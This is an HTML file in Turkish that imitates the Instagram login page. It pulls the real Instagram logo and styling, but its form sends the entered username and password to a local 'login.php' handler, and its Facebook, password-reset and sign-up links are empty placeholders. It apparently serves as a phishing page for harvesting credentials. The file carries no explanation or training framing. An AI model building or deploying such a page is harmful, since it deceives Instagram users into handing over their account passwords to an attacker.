<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; margin-bottom: 10px; }
        .logo { width: 175px; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 7px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:disabled { background-color: #b2dffc; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .fb-login { color: #385185; font-weight: bold; text-decoration: none; font-size: 14px; display: block; margin-bottom: 15px; }
        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; }
        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; margin-top: 10px; font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <div>
        <div class="login-container">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a251110aa34.png" alt="Instagram" class="logo">
            <form action="login.php" method="POST">
                <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
                <input type="password" name="password" placeholder="Şifre" required>
                <button type="submit">Giriş Yap</button>
            </form>
            <div class="divider"> YA DA </div>
            <a href="#" class="fb-login">Facebook ile Giriş Yap</a>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        </div>
        <div class="signup-box">
            Hesabın yok mu? <a href="#">Kaydol</a>
        </div>
    </div>
</body>
</html>
